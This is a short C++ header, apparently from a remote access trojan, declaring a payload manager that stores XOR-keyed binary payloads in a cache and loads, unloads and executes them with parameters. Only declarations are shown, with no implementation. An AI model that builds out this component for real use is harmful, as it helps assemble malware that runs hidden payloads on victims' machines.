#include <unordered_map>
#include <string>
#include <vector>
#include <cstdint>
#include <filesystem>

namespace rat::payload {


struct PayloadManager {
    std::unordered_map< std::string, std::vector<uint8_t> > payloads_map;
    char* xor_key;
    size_t xor_key_length;
    std::filesystem::path cache_dir;
    
    PayloadManager(const std::string& Xor_Key);
    ~PayloadManager(void);
        
    void setCacheDir(const std::filesystem::path& Dir_Path);

    /*The payload manager is the owner of the payload now*/;
    bool load(const std::string& arg_Key, std::vector<uint8_t>& arg_Payload);
    
    bool unload(const std::string& arg_Key);

    void reset();

    bool execute(const std::string& arg_Key,
                             const std::vector<std::string>& arg_Parameters,
                             std::string& Response_Buffer) ;
};//struct PayloadManager

}//rat::payload
